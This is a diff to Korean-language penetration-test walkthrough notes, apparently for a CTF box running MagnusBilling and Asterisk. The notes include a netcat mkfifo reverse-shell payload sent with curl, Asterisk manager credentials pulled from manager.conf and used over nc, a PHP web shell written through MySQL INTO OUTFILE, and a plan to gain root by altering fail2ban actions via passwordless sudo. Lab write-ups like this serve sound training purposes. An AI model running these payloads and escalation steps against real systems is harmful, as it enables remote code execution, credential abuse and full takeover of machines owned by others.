@@ -385,6 +385,120 @@ PAYLOAD=";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
 curl -s "$TARGET" --get --data-urlencode "democ=$PAYLOAD"
 ```
 
----
+# SUID 루팅
+find / -perm -4000 -type f 2>/dev/null
+# 결과 없으므로 다른 방법
 
-필요하시면 이후 `privilege escalation`, `MySQL credential reuse`, `Asterisk exploit`, `SUID 바이너리 분석` 등 다음 단계도 정리해드릴 수 있습니다.
+# Asterisk Call Manager 서비스를 확인했으므로 설정 파일 확인
+cat /etc/asterisk/manager.conf
+[general]
+enabled = yes
+port = 5038
+bindaddr = 0.0.0.0
+
+[magnus]
+secret = magnussolution
+permit = 127.0.0.1/255.255.255.0
+read = system,call,log,verbose,agent,user,config,dtmf,reporting,cdr,dialplan
+write = system,call,agent,user,config,command,reporting,originate
+# id: magnus
+# secret: magnussolution
+# permit: (접근 허용 범위) 127.0.0.1
+
+
+# Asterisk Call Manager를 통해 명령어 실행
+nc 127.0.0.1 5038
+# 하나하나 직접 입력하고 마지막에 엔터 두번 (마지막 한 줄 비우기)
+Action: Login
+Username: magnus
+Secret: magnussolution
+
+printf "Action: Login\r\nUsername: magnus\r\nSecret: magnussolution\r\n\r\n" | nc 127.0.0.1 5038
+# \r → Carriage Return (CR, ASCII 13)
+# \n → Line Feed (LF, ASCII 10)
+# \r\n = CR + LF
+
+
+
+# DB 접속 -> 실패
+mysql -h 127.0.0.1 -P 3306 -u magnus -p
+
+# 권한 조회
+SELECT user, host, plugin FROM mysql.user;
+
+# UDF나 프로시저 확인
+SHOW PROCEDURE STATUS WHERE Db = 'mbilling';
+
+# INTO OUTFILE 으로 웹쉘 업로드 시도
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/mbilling/shell.php";
+
+# 웹 브라우저로 접속해서 명령 실행
+http://target/mbilling/shell.php?cmd=id
+
+
+
+
+상황 요약
+Fail2ban가 cat /var/log/asterisk/messages 로그 파일을 감시해서 공격 패턴을 탐지함.
+
+asterisk-iptables jail에서 패턴이 탐지되면 iptables-allports라는 액션이 실행됨.
+
+이 액션은 공격 IP를 방화벽(iptables)에 추가해 차단(ban)하는 역할을 수행함.
+
+asterisk 사용자가 sudo로 fail2ban-client를 비밀번호 없이 실행 가능.
+
+root 권한 프로세스인 fail2ban 서버에 명령을 내려서 동작을 바꿀 가능성을 탐색 중임.
+
+왜 이렇게 생각하는가?
+1. Fail2ban 구조 이해
+Fail2ban은 jail, filter, action 세 가지 요소로 구성됨
+
+jail: 어떤 로그파일을 감시하고, 어떤 필터를 적용할지 정함.
+
+filter: 정규표현식으로 로그에서 특정 패턴(공격 시그니처 등)을 찾아냄.
+
+action: 패턴이 감지됐을 때 수행할 명령어(주로 iptables 명령으로 IP 차단).
+
+이때 action은 쉘 명령어 집합이며, root 권한으로 실행됨.
+
+2. Sudo 권한과 Fail2ban 명령 조작 가능성
+asterisk 사용자가 sudo fail2ban-client를 비밀번호 없이 실행 가능함.
+
+fail2ban-client는 Fail2ban 서버와 통신하는 인터페이스지만, 명령의 실행은 서버 프로세스(=root)가 담당함.
+
+따라서 fail2ban-client로 fail2ban 설정을 변경하거나 특정 액션을 실행하도록 조작할 수 있다면 root 권한 명령 실행 가능.
+
+3. 액션(action)을 악용하는 시도
+기본적으로는 공격 IP를 차단하는 iptables 명령어가 들어가 있음.
+
+만약 이 액션(action) 스크립트나 명령어를 수정하거나 교체할 수 있다면, 임의의 명령 실행 가능.
+
+즉, iptables-allports 대신에 root 권한으로 실행되는 임의 쉘 명령을 삽입하면 권한 상승 가능.
+
+4. sudo fail2ban-client get asterisk-iptables actions 명령 의도
+이 명령은 현재 jail에서 사용하는 액션 이름을 출력함.
+
+액션 이름을 알면 해당 액션이 어떤 쉘 스크립트나 명령어를 실행하는지 /etc/fail2ban/action.d/iptables-allports.conf 같은 파일에서 확인 가능.
+
+액션의 내용(스크립트나 명령어)을 분석해서 악용 포인트(예: 쉘 명령어 인젝션, 임의 파일 덮어쓰기 등)가 있는지 탐색 가능.
+
+결론 및 다음 단계 제안
+왜 액션 이름을 먼저 확인?
+→ 어떤 명령어가 실행되는지 알아야 악용 경로를 찾을 수 있기 때문.
+
+왜 액션을 수정하려 하나?
+→ 현재 설정은 IP 차단만 하므로 권한 상승 불가능.
+→ 액션을 바꿔서 root 권한으로 임의 명령을 실행시킬 수 있다면 권한 상승 가능.
+
+다음으로는:
+
+/etc/fail2ban/action.d/iptables-allports.conf 파일 내용을 확인한다.
+
+액션 내용을 분석해서, 악용 가능 여부(예: 명령어 인젝션, 파일 쓰기 등)를 판단한다.
+
+fail2ban 설정을 변경하거나 새로운 액션을 만들어서, fail2ban-client 명령으로 실행시키는 방법을 시도해본다.
+
+
+sudo /usr/bin/fail2ban-client get asterisk-iptables actions
+iptables-allports-ASTERISK
+$ 
